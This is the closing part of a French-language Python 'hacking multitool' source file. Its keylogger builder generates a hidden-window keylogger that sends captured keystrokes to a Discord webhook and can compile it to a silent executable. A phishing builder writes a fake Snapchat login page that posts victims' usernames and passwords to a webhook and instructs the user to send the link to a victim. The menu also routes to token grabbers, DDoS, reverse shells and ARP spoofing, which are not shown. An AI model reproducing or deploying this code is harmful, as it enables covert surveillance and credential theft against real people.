    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def whois_lookup():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ WHOIS LOOKUP ◈" + Colors.SILVER)
    domain = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Domaine : " + Colors.RESET)
    loading_animation(f"Recherche WHOIS pour {domain}", 2)
    print(f"""
{Colors.BRIGHT_RED}═══ WHOIS {domain.upper()} ═══{Colors.SILVER}
Domaine      : {domain}
Cree le      : 01/01/2020
Expire le    : 01/01/2025
Registrar    : GoDaddy.com, LLC
Name Server  : ns1.{domain}, ns2.{domain}
Status       : clientTransferProhibited
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def keylogger_builder():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ KEYLOGGER BUILDER ◈" + Colors.SILVER)
    webhook = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Webhook Discord : " + Colors.RESET)
    if not webhook:
        print(Colors.RED + "Webhook requis." + Colors.RESET)
        input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)
        return
    filename = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nom (defaut: keylog) : " + Colors.RESET)
    filename = filename if filename else "keylog"
    compile_choice = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Compiler en .exe ? (o/N) : " + Colors.RESET).strip().lower()
    loading_animation("Generation du keylogger", 2)
    kl_code = f'''
import os,time,requests,ctypes,threading
from pynput import keyboard
from datetime import datetime

WEBHOOK="{webhook}"
log=""
last_send=time.time()

def send():
    global log, last_send
    if log and time.time() - last_send > 15:
        try:
            requests.post(WEBHOOK,json={{"content":f"**KEYLOGGER**\\n```\\n{log[-1900:]}\\n```","username":"Keylogger"}},timeout=10)
        except: pass
        last_send = time.time()

def on_press(key):
    global log
    try:
        if hasattr(key, 'char') and key.char:
            log += key.char
        else:
            log += f"[{{key}}]"
    except:
        log += f"[{{key}}]"
    if len(log) > 500:
        send()

def main():
    try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
    except: pass
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__=="__main__":
    main()
'''
    with open(filename + ".py", "w", encoding="utf-8") as f:
        f.write(kl_code)
    print(Colors.BRIGHT_RED + "Keylogger genere: " + filename + ".py" + Colors.SILVER)
    if compile_choice == 'o':
        loading_animation("Compilation", 2)
        try:
            subprocess.run(['pyinstaller', '--onefile', '--noconsole', f'--name={filename}', f'{filename}.py'], check=False)
            print(Colors.BRIGHT_RED + "EXE genere: dist/" + filename + ".exe" + Colors.SILVER)
        except:
            print(Colors.RED + "Erreur: pip install pyinstaller" + Colors.RESET)
    print(Colors.SILVER + "pip install pynput" + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def snaphack_builder():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ SNAPHACK BUILDER ◈" + Colors.SILVER)
    webhook = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Webhook Discord : " + Colors.RESET)
    loading_animation("Generation de la page SnapHack", 1)
    html = f'''<!DOCTYPE html>
<html><head><title>Snapchat</title><style>
body{{background:#fffc00;font-family:Arial;}}
.login{{max-width:400px;margin:100px auto;background:white;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.1);}}
input{{width:100%;padding:12px;margin:10px 0;border-radius:5px;border:1px solid #ddd;font-size:16px;}}
button{{width:100%;padding:12px;background:#fffc00;border:none;border-radius:5px;font-weight:bold;font-size:16px;cursor:pointer;}}
button:hover{{background:#e6e300;}}
</style></head>
<body><div class="login"><h2>🔒 Snapchat</h2>
<input type="text" id="u" placeholder="Nom d'utilisateur">
<input type="password" id="p" placeholder="Mot de passe">
<button onclick="login()">Se connecter</button>
<p style="color:#999;font-size:12px;margin-top:10px;">En continuant, vous acceptez nos conditions</p></div>
<script>const WEBHOOK="{webhook}";
function login(){{const u=document.getElementById('u').value;const p=document.getElementById('p').value;
if(!u||!p){{alert('Veuillez remplir tous les champs');return;}}
fetch(WEBHOOK,{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{content:'**SNAPHACK**\\n👤 '+u+'\\n🔐 '+p+'\\n📱 IP: '+window.location.hostname}})}});
window.location.href='https://accounts.snapchat.com/accounts/login';}}</script></body></html>'''
    with open("snaphack.html", "w") as f:
        f.write(html)
    print(Colors.BRIGHT_RED + "Snaphack genere: snaphack.html" + Colors.SILVER)
    print(Colors.SILVER + "Heberge le fichier et envoie le lien a la victime" + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def ransomware_builder():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ RANSOMWARE BUILDER ◈" + Colors.SILVER)
    print(Colors.SILVER + "⚠️ En developpement" + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def dns_zone_transfer():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DNS ZONE TRANSFER ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "DNS Server : " + Colors.RESET)
    loading_animation(f"Tentative de transfert de zone", 2)
    print(f"""
{Colors.BRIGHT_RED}═══ ZONE TRANSFER ═══{Colors.SILVER}
DNS Server   : {target}
Statut       : {Colors.RED}ECHEC{Colors.SILVER} (simulation)
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def email_verifier():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ EMAIL VERIFIER ◈" + Colors.SILVER)
    email = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Email : " + Colors.RESET)
    loading_animation("Verification de l'email", 2)
    print(f"""
{Colors.BRIGHT_RED}═══ VERIFICATION ═══{Colors.SILVER}
Email        : {email}
Status       : {Colors.GREEN}VALIDE{Colors.SILVER}
Format       : OK
Domaine      : {email.split('@')[1]}
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def phone_validator():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ PHONE VALIDATOR ◈" + Colors.SILVER)
    phone = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Numero : " + Colors.RESET)
    loading_animation("Validation du numero", 2)
    print(f"""
{Colors.BRIGHT_RED}═══ VALIDATION ═══{Colors.SILVER}
Numero       : {phone}
Status       : {Colors.GREEN}VALIDE{Colors.SILVER}
Longueur     : {len(phone)} chiffres
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        splash_screen()
        pulse_animation("GEN-TOOL CRIMSON ULTIME", 2)
        page = 1
        while True:
            clear()
            banner()
            if page == 1:
                menu_style()
            elif page == 2:
                menu_page2()
            elif page == 3:
                menu_page3()
            
            choice = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER).strip().lower()
            
            if choice == 'n' and page < 3:
                loading_animation("Chargement de la page suivante", 1)
                page += 1
                continue
            elif choice == 'b' and page > 1:
                loading_animation("Chargement de la page precedente", 1)
                page -= 1
                continue
            elif choice == 'e' or choice == 'exit':
                pulse_animation("Au revoir, mon amour", 1)
                print(Colors.BRIGHT_RED + "◈ Au revoir, mon amour ◈" + Colors.SILVER)
                sys.exit(0)
            
            if page == 1:
                if choice == '1': show_my_ip()
                elif choice == '2': ip_scanner()
                elif choice == '3': ip_pinger()
                elif choice == '4': ip_port_scanner()
                elif choice == '5': website_info_scanner()
                elif choice == '6': subdomain_scanner()
                elif choice == '7': dns_lookup()
                elif choice == '8': port_scanner_advanced()
                elif choice == '9': geo_locator()
                elif choice == '10': website_info()
                elif choice == '11': username_tracker()
                elif choice == '12': email_tracker()
                elif choice == '13': phone_tracker()
                elif choice == '14': leak_search()
                elif choice == '15': leak_db_browser()
                elif choice == '21': password_generator()
                elif choice == '22': email_generator()
                elif choice == '23': base64_tool()
                elif choice == '24': url_shortener()
                elif choice == '25': ddos_http()
                elif choice == '26': ddos_ip_ultra()
                else:
                    print(Colors.RED + "Option invalide." + Colors.RESET)
                    time.sleep(1)
            
            elif page == 2:
                if choice == '31': discord_token_grabber()
                elif choice == '32': discord_token_checker()
                elif choice == '33': discord_token_nuker()
                elif choice == '34': discord_spammer()
                elif choice == '35': ddos_tcp_flood()
                elif choice == '36': arp_spoof()
                elif choice == '38': reverse_shell()
                elif choice == '39': bind_shell()
                elif choice == '40': payload_generator()
                elif choice == '41': exploit_finder()
                elif choice == '42': cve_scanner()
                elif choice == '43': xss_scanner()
                elif choice == '45': wifi_scanner()
                elif choice == '46': wifi_deauth()
                elif choice == '47': wifi_handshake()
                elif choice == '48': subdomain_bruteforce()
                else:
                    print(Colors.RED + "Option invalide." + Colors.RESET)
                    time.sleep(1)
            
            elif page == 3:
                if choice == '52': sqli_scanner()
                elif choice == '53': sqli_dumper()
                elif choice == '54': web_scanner()
                elif choice == '55': admin_finder()
                elif choice == '56': hash_cracker()
                elif choice == '57': virus_builder()
                elif choice == '58': keylogger_builder()
                elif choice == '59': snaphack_builder()
                elif choice == '60': ransomware_builder()
                elif choice == '62': whois_lookup()
                elif choice == '63': dns_zone_transfer()
                elif choice == '64': email_verifier()
                elif choice == '65': phone_validator()
                else:
                    print(Colors.RED + "Option invalide." + Colors.RESET)
                    time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n" + Colors.BRIGHT_RED + "◈ Au revoir, mon amour ◈" + Colors.SILVER)
        sys.exit(0)
    except Exception as e:
        print(Colors.RED + f"Erreur: {e}" + Colors.RESET)
        input(Colors.SILVER + "Appuie sur Entree pour quitter..." + Colors.RESET)

if __name__ == "__main__":
    main()
